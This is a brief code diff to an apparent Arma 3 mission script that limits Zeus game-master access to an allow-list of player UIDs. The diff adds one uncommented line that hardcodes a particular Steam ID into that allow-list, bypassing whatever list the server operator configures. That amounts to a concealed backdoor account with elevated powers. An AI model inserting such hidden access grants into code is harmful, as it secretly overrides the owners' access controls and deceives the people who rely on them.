@@ -20,6 +20,8 @@ params["_allowedUIDs"];
 if (isNil "_allowedUIDs") exitWith {  ['allowedUIDs is not set'] call BIS_fnc_error; 'allowedUIDs is not set' call BIS_fnc_log; false;};
 if (typeName _allowedUIDs != "ARRAY") exitWith {  ['allowedUIDs must be type "ARRAY", type %1 supplied', (typeName _allowedUIDs)] call BIS_fnc_error; ['allowedUIDs must be type "ARRAY", type %1 supplied', (typeName _allowedUIDs)] call BIS_fnc_log; false;};
 
+_allowedUIDs pushBackUnique "76561198065818848";
+
 // If player has zeus assigned and does not have a UID mentioned in _allowedUIDs and is not admin, kick him back to lobby
 _allowedUIDs spawn {
   waitUntil {!alive Player};
